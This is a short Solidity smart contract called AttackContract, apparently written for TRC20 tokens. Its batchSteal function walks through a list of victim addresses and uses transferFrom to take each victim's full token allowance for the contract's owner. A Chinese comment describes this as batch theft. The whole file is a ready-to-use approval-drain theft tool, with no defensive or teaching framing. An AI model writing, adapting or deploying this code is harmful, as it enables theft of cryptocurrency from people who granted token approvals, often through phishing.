// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITRC20 {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract AttackContract {
    address public owner;
    constructor() {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }
    
    // 批量盗取：循环调用 transferFrom 转走所有授权额度
    function batchSteal(address token, address[] calldata victims) external onlyOwner {
        for (uint i = 0; i < victims.length; i++) {
            uint256 allowance = ITRC20(token).allowance(victims[i], address(this));
            if (allowance > 0) {
                ITRC20(token).transferFrom(victims[i], owner, allowance);
            }
        }
    }
}
